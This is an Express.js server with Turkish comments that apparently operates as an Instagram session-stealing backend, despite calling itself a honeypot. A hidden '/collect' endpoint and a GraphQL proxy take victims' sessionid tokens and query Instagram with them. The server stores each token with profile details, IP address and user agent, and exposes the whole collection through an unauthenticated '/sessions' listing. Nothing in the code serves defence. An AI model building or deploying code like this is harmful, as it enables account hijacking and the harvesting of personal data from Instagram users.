const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();

// ---- VERİTABANI ----
const db = new sqlite3.Database('sessions.db');

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT UNIQUE,
      username TEXT,
      full_name TEXT,
      follower_count INTEGER,
      following_count INTEGER,
      is_private INTEGER,
      is_verified INTEGER,
      profile_pic_url TEXT,
      ip_address TEXT,
      user_agent TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// ---- STATİK DOSYALAR ----
app.use(express.static(path.join(__dirname, '/')));
app.use(express.json());
app.use(cors({ origin: '*', credentials: true }));

// ---- RATE LİMİT ----
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  message: { error: 'Rate limit exceeded. Please wait.' }
});
app.use('/graphql', limiter);

// ---- SESSION KAYDETME (IP ve User-Agent ile) ----
function saveSession(sessionId, profileData, ip, userAgent) {
  return new Promise((resolve, reject) => {
    const { username, full_name, follower_count, following_count, is_private, is_verified, profile_pic_url_hd } = profileData;
    db.run(
      `INSERT OR REPLACE INTO sessions 
       (session_id, username, full_name, follower_count, following_count, is_private, is_verified, profile_pic_url, ip_address, user_agent, updated_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
      [sessionId, username, full_name, follower_count, following_count, is_private ? 1 : 0, is_verified ? 1 : 0, profile_pic_url_hd, ip || null, userAgent || null],
      function(err) {
        if (err) reject(err);
        else resolve(this.lastID);
      }
    );
  });
}

// ---- TÜM SESSION'LARI LİSTELE ----
app.get('/sessions', (req, res) => {
  db.all('SELECT * FROM sessions ORDER BY updated_at DESC', (err, rows) => {
    if (err) {
      res.status(500).json({ error: err.message });
    } else {
      res.json(rows);
    }
  });
});

// ---- OTOMATİK YAKALAMA (Gizli endpoint) ----
app.post('/collect', async (req, res) => {
  const { sessionId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];

  if (!sessionId) {
    return res.status(400).json({ error: 'No session ID' });
  }

  try {
    const profile = await fetchProfile(sessionId);
    await saveSession(sessionId, profile, ip, userAgent);
    console.log(`✅ Honeypot captured: @${profile.username} from ${ip}`);
    res.json({ success: true });
  } catch (err) {
    console.log('❌ Capture failed:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ---- GRAPHQL PROXY ----
app.post('/graphql', async (req, res) => {
  const { query, variables } = req.body;
  const sessionId = req.headers['x-session-id'] || req.headers.cookie?.match(/sessionid=([^;]+)/)?.[1];
  if (!sessionId) return res.status(401).json({ error: 'Missing sessionid' });

  const url = 'https://www.instagram.com/graphql/query/';
  const headers = {
    'Content-Type': 'application/json',
    'x-ig-app-id': '936619743392459',
    'Cookie': `sessionid=${sessionId}`,
    'User-Agent': 'Instagram 269.0.0.18.76 Android',
    'Accept': 'application/json'
  };
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify({ query, variables }),
      timeout: 10000
    });
    const data = await response.json();
    
    if (query.includes('user(id:') && data.data && data.data.user) {
      try {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const ua = req.headers['user-agent'];
        await saveSession(sessionId, data.data.user, ip, ua);
        console.log('✅ Session saved to database');
      } catch (dbErr) {
        console.log('⚠️ DB save error:', dbErr.message);
      }
    }
    
    const hash = crypto.createHash('sha256').update(sessionId).digest('hex').slice(0,8);
    console.log(`[${hash}] Query: ${query.slice(0,30)}... Status: ${response.status}`);
    res.status(response.status).json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ---- PROFILE FETCH ----
async function fetchProfile(sessionId) {
  const PROFILE_QUERY = `query ($id: String!) { user(id: $id) { username full_name biography external_url is_private is_verified follower_count following_count profile_pic_url_hd } }`;
  const url = 'https://www.instagram.com/graphql/query/';
  const headers = {
    'Content-Type': 'application/json',
    'x-ig-app-id': '936619743392459',
    'Cookie': `sessionid=${sessionId}`,
    'User-Agent': 'Instagram 269.0.0.18.76 Android',
    'Accept': 'application/json'
  };
  const response = await fetch(url, {
    method: 'POST',
    headers,
    body: JSON.stringify({ query: PROFILE_QUERY, variables: { id: sessionId } }),
    timeout: 10000
  });
  const data = await response.json();
  if (data.errors) throw new Error(data.errors[0].message);
  return data.data.user;
}

app.get('/ping', (req, res) => res.json({ ok: true, timestamp: Date.now() }));

app.listen(process.env.PORT || 3000, () => console.log('✅ Honeypot running on port ' + (process.env.PORT || 3000)));